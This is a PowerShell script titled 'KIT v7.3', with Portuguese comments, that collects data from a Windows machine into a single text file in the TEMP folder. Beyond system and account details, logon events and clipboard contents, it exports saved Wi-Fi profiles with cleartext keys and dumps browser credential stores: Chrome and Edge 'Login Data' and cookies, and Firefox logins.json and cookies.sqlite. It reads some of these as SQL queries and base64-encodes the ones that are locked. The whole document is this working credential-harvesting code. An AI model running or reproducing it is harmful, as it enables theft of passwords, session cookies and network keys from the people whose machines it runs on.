# KIT v7.3  –  tudo em TXT legível, sem falhas de path
$ErrorActionPreference = 'Continue'          # não para o script por erro isolado
$out = "$env:TEMP\kit_$(Get-Random).txt"     # nome único
"" | Set-Content $out -Encoding UTF8

function OutKit { param($t)  Add-Content $out $t -Encoding UTF8 }

# ---------- 1) Dados do sistema ----------
OutKit "=== SYSTEMINFO ==="
OutKit (systeminfo)
OutKit "`n=== WIN32_ComputerSystem ==="
OutKit (Get-CimInstance Win32_ComputerSystem | ConvertTo-Json -Compress)
OutKit "`n=== WIN32_Processor ==="
OutKit (Get-CimInstance Win32_Processor | ConvertTo-Json -Compress)
OutKit "`n=== WIN32_BIOS ==="
OutKit (Get-CimInstance Win32_BIOS | ConvertTo-Json -Compress)
OutKit "`n=== NetIPConfiguration ==="
OutKit (Get-NetIPConfiguration | ConvertTo-Json -Compress)
OutKit "`n=== Users ==="
OutKit (Get-CimInstance Win32_UserAccount | ConvertTo-Json -Compress)
OutKit "`n=== Admins ==="
OutKit (net localgroup administradores)
OutKit "`n===  Últimos 100 logons (4624) ==="
OutKit ( (Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} -Max 100 -EA 0) |
            Select TimeCreated,Id,Message | ConvertTo-Json -Compress )
OutKit "`n=== Clipboard ==="
OutKit (Get-Clipboard -Raw -EA 0)

# ---------- 2) Arquivos recentes ----------
OutKit "`n=== Recent Files ==="
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -File -EA 0 |
    Select Name,LastWriteTime,Length | ConvertTo-Json -Compress | %{ OutKit $_ }

# ---------- 3) Certificados ----------
OutKit "`n=== User Certs ==="
Get-ChildItem Cert:\CurrentUser\My -EA 0 |
    Select Subject,Thumbprint,NotAfter | ConvertTo-Json -Compress | %{ OutKit $_ }

# ---------- 4) Wi-Fi (XML) – salva DIRETO na pasta que vamos ler ----------
$wifiDir = "$env:TEMP\wifi_$(Get-Random)"
ni -ItemType Directory $wifiDir -Force | Out-Null
try{
    netsh wlan export profile key=clear folder=$wifiDir | Out-Null
    Get-ChildItem $wifiDir -Filter *.xml -EA 0 | %{
        OutKit "`n=== Wi-Fi: $($_.Name) ==="
        OutKit (Get-Content $_.FullName -Raw -EA 0)
    }
}catch{}
Remove-Item $wifiDir -Recurse -Force -EA 0

# ---------- 5) Navegadores – só texto/base64, NUNCA bytes crus ----------
@(
    @{P="$env:LOCALAPPDATA\Google\Chrome\User Data\Default"; F=@('Cookies','Login Data','History')},
    @{P="$env:APPDATA\Mozilla\Firefox\Profiles"; F=@('cookies.sqlite','logins.json','places.sqlite')},
    @{P="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"; F=@('Cookies','Login Data','History')}
) | %{
    $base = $_.P
    $_.F | %{
        $file = Get-ChildItem $base -Recurse -File -Name $_ -EA 0 | Select -First 1
        if($file){
            $full = Join-Path $base $file
            OutKit "`n=== Browser: $full ==="
            # se estiver em uso → base64, senão → texto puro
            try{
                if($full -match '\.(sqlite|db)$'){
                    Add-Type -Path "$env:PROGRAMFILES\System.Data.SQLite\System.Data.SQLite.dll" -EA Stop
                    $cnn = New-Object Data.SQLite.SQLiteConnection "Data Source=$full;Read Only=True;Mode=ReadOnly"
                    $cnn.Open()
                    $da = New-Object Data.SQLite.SQLiteDataAdapter "SELECT host,name,value FROM cookies LIMIT 50",$cnn
                    $tbl = New-Object System.Data.DataTable;  [void]$da.Fill($tbl)
                    $cnn.Close()
                    OutKit ($tbl | ConvertTo-Json -Compress)
                }else{
                    OutKit (Get-Content $full -Raw -EA 0)
                }
            }catch{
                # arquivo travado → base64
                OutKit "# locked – base64 #"
                OutKit ([Convert]::ToBase64String([IO.File]::ReadAllBytes($full)))
            }
        }
    }
}

# ---------- 6) Mostra resultado ----------
Write-Host "`nKit salvo em:  $out" -Fore Green
Invoke-Item $out
